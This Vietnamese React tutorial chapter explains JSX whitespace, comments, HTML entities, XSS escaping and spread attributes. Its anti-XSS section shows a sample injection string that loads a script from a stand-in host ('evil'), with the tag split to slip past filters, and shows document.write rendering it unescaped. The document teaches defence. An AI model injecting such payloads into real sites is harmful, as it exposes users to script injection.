# JSX
- Bạn đã thấy JSX hoạt động trong các chương trước. Bạn biết rằng tất cả là về việc các biểu thức Js chứa XML trông rất giống HTML
    
    ```jsx
    const hi = <h1>Hello</h1>;
    ```
    
- Và bạn biết rằng bạn luôn co thể “ngắt dòng chảy” của XML bằng cách bao gồm nhiều biểu thức Js được bao bọc trong dấu ngoặc nhọn
    
    ```jsx
    const planet = 'Earth';
    const hi = <h1>Hello people of <em>{planet}</em>!</h1>;
    ```
    
- Điều đó đúng ngay cả khi biểu thức điều kiện, vòng lặp hoặc nhiều JSX hơn
    
    ```jsx
    const rock = 3;
    const planet = <em>{rock === 3 ? 'Earth' : 'Some other place'}</em>;
    const hi = <h1>Hello people of {planet}!</h1>;
    ```
    
- Trong chương này, bạn sẽ học thêm về JSX và khám phá 1 số tính năng có thể khiến bạn ngạc nhiên hoặc thích thú

## A Couple Tools

- Để thử nghiệm và làm quen với chuyển đổi JSX, bạn có thể chơi với chỉnh sửa trực tiếp tại  [**https://babeljs.io/repl](https://www.google.com/url?sa=E&q=https%3A%2F%2Fbabeljs.io%2Frepl).** Hãy đảm bảo bạn đã chọn đúng tuỳ chọn `Prettify` để có khả năng đọc kết quả tốt hơn.
- Như bạn có thể thấy, chuyển đổi JSX là nhẹ nhàng và đơn giản: nguồn JSX của “Hello world”! từ chương 1 trở thành 1 loạt các cuộc gọi đến `React.createElement()` sử dụng cú pháp hàm mà React hoạt động. Nó chỉ là Js, vì vậy rất dễ đọc và hiểu
- Bây giờ, hãy đến 1 số đặc điểm cụ thể của JSX

## Whitespace in JSX

- Khoảng trắng trong JSX tương tự như HTML nhưng không giống hệt
    
    ```jsx
    function Example1() {
      return (
        <h1>
          {1} plus {2} is {3}
        </h1>
      );
    }
    ```
    
- Khi React hiển thị nó trong trình duyệt (bạn có thể kiểm tra HTML kết quả trong công cụ dành cho developer của trình duyệt), HTML được tạo ra trông sẽ như thế này
    
    ```jsx
    <h1>1 plus 2 is 3</h1>
    ```
    
- Điều này thực sự là một node DOM `h1` với 5 nút con, là các nút phần tử văn bản với nội dung 1, plus, 2, is và 3 được hiển thị dưới dạng “1 plus 2 is 3”. Chính xác như bạn mong đợi trong HTML, nhiều khoảng trắng sẽ trở thành một khi được hiển thị trong trình duyệt
- Tuy nhiên ví dụ tiếp theo này
    
    ```jsx
    function Example2() {
      return (
        <h1>
          {1}
          plus
          {2}
          is
          {3}
        </h1>
      );
    }
    ```
    
- Bạn sẽ kết thúc với
    
    ```jsx
    <h1>
      1plus2is3
    </h1>
    ```
    
- Như bạn đã thấy, tất cả các khoảng trắng đề bị cắt bỏ, vì vậy, kết quả cuối cùng được hiển thị trong trình duyệt là `1plus2is3". Bạn luôn có thể thêm khoảng trắng vào nơi cần thiết bằng `{' '}` hoặc chuyển các chuỗi văn bản trực tiếp thành các biểu thức và thêm khoảng trắng vào đó. Nói cách khác, bất kỳ cái nào trong số này đều hoạt động
    
    ```jsx
    function Example3() {
      return (
        <h1>
          {/* biểu thức khoảng trắng */}
          {1}
          {' '}plus{' '}
          {2}
          {' '}is{' '}
          {3}
        </h1>
      );
    }
    
    function Example4() {
      return (
        <h1>
          {/* khoảng trắng được dán vào biểu thức chuỗi */}
          {1}
          {' plus '}
          {2}
          {' is '}
          {3}
        </h1>
      );
    }
    ```
    

## Comments in JSX

- Trong mấy ví dụ ban nãy, chắc bạn cũng thấy có một số khái niệm mới len lỏi vào rồi đấy - đó là thêm comments và cái mới JSX hỗn độn này
- Vì mấy cái biểu thức được gói trong {} thực chất chỉ là Js “trá hình” thôi, nên bạn có thể dễ dàng thêm comment nhiều dòng bằng cách dùng `/* comment */` . Bạn cũng có thể thêm comment 1 dòng bằng cáh sử dụng // nhưng phải đảm bảo là cái dấu đóng `}` của biểu thức nằm trên 1 dòng riêng biệt, chứ không là nó bị coi là một phần của comment đấy nhé
    
    ```jsx
    <h1>
     {/* bình luận nhiều dòng - tha hồ mà chém gió */}
     {/*
     chém gió 
     nhiều 
     dòng 
     luôn
     */}
     {
     // bình luận một dòng - ngắn gọn xúc tích
     }
     Xin chào!
    </h1>
    ```
    
- Vì `{//comment}` không hoạt động (cái dấu } bị khoá mõm mất rồi), nên dùng comment 1 dòng cũng chẳng có lợi lộc gì. Thôi thì cứ giữ comment cho nhất quán, dùng comment nhiều dòng trong mọi trường hợp cho nó lành

## HTML Entities

- Bạn có thể dùng HTML trong JSX như thế này
    
    ```jsx
    <h2>
     Thông tin thêm »
    </h2>
    ```
    
- Ví dụ này sẽ tạo ra một cái dấu ngoặc kép góc phải
- Tuy nhiên nếu bạn dùng thực thể này như 1 phần của biểu thức, bạn sẽ gặp vấn đề “mã hoá kép”
    
    ```jsx
    <h2>
     {"Thông tin thêm »"}
    </h2>
    
    // KQ: Thong tin them &raquo
    ```
    
- Để tránh vụ “mã hoá kép” này, bạn có thể dùng phiên bản Unicode của HTML, trong trường hợp này là `\u00bb
    
    ```jsx
    <h2>
     {"Thông tin thêm \u00bb"}
    </h2>
    ```
    
- Để cho tiện, bạn có thể định nghĩa 1 const ở đâu đó trên đầu module của bạn cùng với bất kỳ khoảng trắng nào
    
    ```jsx
    const RAQUO = ' \u00bb'; 
    ```
    
- Sau đó, cứ dùng hằng số này ở bất cứ đâu bạn cần
    
    ```jsx
    <h2>
     {"Thông tin thêm" + RAQUO}
    </h2>
    <h2>
     {"Thông tin thêm"}{RAQUO}
    </h2>
    ```
    

## Anti-XSS

- Chắc bạn đang thắc mắc tại sao phải “vòng vo” để dùng HTML?
- Có 1 lý do chính đáng hơn hẳn những cái bất tiện kia: Bạn cần chống lại cross-site scripting -XSS)
- React sẽ **thoát** hết tất cả các chuỗi để ngăn chặn 1 loại tấn công XSS. Khi bạn bắt người dùng nhập vào input, và họ nhập vào 1 chuỗi `độc hại` , React sẽ bảo vệ bạn
    
    ```jsx
    const firstname = 'John<scr'+'ipt src="https://evil/co.js"></scr'+'ipt>';
    ```
    
- Trong 1 số trường hợp, bạn có thể ghi vào DOM
    
    ```jsx
    document.write(firstname);
    ```
    
- Thế là xong, vì trang web sẽ hiển thị “John”, nhưng đoạn `script` lại tải 1 đoạn code **đen tối** từ một trang web thứ 3, có thể là của hacker
- Điều này dẫn đến nguy hiểm cho ứng dụng và người dùng có thể không tin tưởng ứng dụng của bạn nữa
- React sẽ tự động bảo vệ bạn khỏi những trường hợp như thế này. React sẽ “thoát” nội dung của `firstname` khi bạn làm như sau
    
    ```jsx
    function Example() {
     const firstname = 'John<scr' + 'ipt src="https://evil/co.js"></scr' + 'ipt>';
     return <h2>Xin chào {firstname}!</h2>;
    }
    ```
    
    ![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9a9d30aa-4822-4cd2-ade5-57a403553962/0a812ab0-2d31-43da-83d9-bb2f09c5bc31/image.png)
    

## Spread Attributes

- JSX **mượn** 1 tính năng của ECMAScript gọi là `spread operator` và áp dụng nó khi định nghĩa các property
- Giả sử bạn có 1 tập hợp các property muốn truyền cho 1 component `<a>`
    
    ```jsx
    const attr = {
     href: 'https://example.org',
     target: '_blank',
    };
    ```
    
- Thường thì chúng ta sẽ làm thế này
    
    ```jsx
    return (
     <a
     href={attr.href}
     target={attr.target}>
     Xin chào
     </a>
    );
    ```
    
- Nhưng cách này thì khá dài, bằng cách sử dụng spread operator, bạn có thể viết ngắn gọn trên 1 dòng
    
    ```jsx
    return <a {...attr}>Xin chào</a>;
    ```
    
- Một cách sử dụng phổ biến khác cho spread là khi bạn nhận 1 object chứa các property từ bên ngoài - thường là từ 1 component cha. Hãy xem chúng diễn ra như thế nào nhé

### Parent-to-Child Spread Attributes

- Giả sử bạn đang xây dựng 1 component `FancyLink` và sử dụng `<a>` bình thường phía sau. Bạn muốn component này chấp nhận mọi attributes mà thẻ a có (href, tag,…) cộng thêm 1 số thuộc tính không phải của HTML chuẩn
- Có thể dùng component `FancyLink` như sau
    
    ```jsx
    <FancyLink
     href="https://example.org"
     rel="canonical"
     target="_blank"
     variant="small">
     Theo dõi tôi
    </FancyLink>
    ```
    
- Làm thế nào để component của bạn tận dụng được attributes spread và tránh phải định nghĩa lại tất cả các attibutes của `<a>`?
- Đây là 1 cách tiếp cận. Trong đó ứng dụng của bạn chỉ cho phép 3 kích thước cho các liên kết và bạn sử dụng component chỉ định kích thước mong muốn thông qua custom attribute `variant` . Sử dụng `switch` và các class của CSS. Sau đó bạn chuyển tất cả các attribute khác sang `<a>`
    
    ```jsx
    function FancyLink(props) {
     const classes = ['link-core'];
     switch (props.variant) {
    case 'small':
     classes.push('link-small');
     break;
     case 'huge':
     classes.push('link-huge');
     break;
     default:
     classes.push('link-default');
     }
     return (
     <a {...props} className={classes.join(' ')}>
     {props.children}
     </a>
     );
    }
    ```
    
- Bạn có thể ý thấy việc sử dụng `props.children` ở đây không? Đây là 1 cách tiện lợi để truyền bất kỳ số lượng con nào sang component của bạn, mà bạn có thể truy cập khi “ghép nối” giao diện người dùng của mình. Trong trường hợp của component `FancyLink` , đoạn mã sau hoàn toàn hợp lệ
    
    ```jsx
    <FancyLink>
     <span>Theo dõi tôi</span>
    </FancyLink>
    ```
    
- Trong đoạn code trên, bạn thực hiện công việc tuỳ chỉnh của mình dựa trên giá trị `variant` sau đó chỉ cần chuyển các thuộc tính sang `<a>`. Điều này bao gồm cả thuộc tính `variant` , thuộc tính này sẽ xuất hiện trong DOM kết quả, mặc dù trình duyệt không sử dụng nó
- Bạn có thể làm tốt hơn 1 chút và không truyền các thuộc tính không cần thiết bằng cách nhân bản các thuộc tính được truyền cho bạn và loại bỏ những thuộc tính mà trình duyệt sẽ bỏ qua
    
    ```jsx
    function FancyLink(props) {
     const classes = ['link-core'];
     switch (props.variant) {
     // giống như trước ...
     }
     const attribs = Object.assign({}, props); // nhân bản nông
     delete attribs.variant;
     return (
     <a {...attribs} className={classes.join(' ')}>
     {props.children}
     </a>
     );
    }
    ```
    
- Một cách khác để sử dụng nhân bản nông là sử dụng toán tử spread của Js
    
    ```jsx
    const attribs = {...props};
    ```
    
- Ngoài ra,  bạn có thể nhân bản các prop bạn truyền cho trình duyệt và đồng thời gán thuộc tính khác cho 1 biến cục bộ (do đó loại bỏ nhu cầu xoá chúng sau đó), tất cả chỉ trong 1 dòng
    
    ```jsx
    const {variant, ...attribs} = props;
    ```
    
- Vì vậy, kết quả cuối cùng cho `FancyLink`
    
    ```jsx
    function FancyLink(props) {
     const {variant, ...attribs} = props;
     const classes = ['link-core'];
     switch (variant) {
     // giống như trước ...
     }
     return (
     <a {...attribs} className={classes.join(' ')}>
     {props.children}
     </a>
     );
    }
    ```
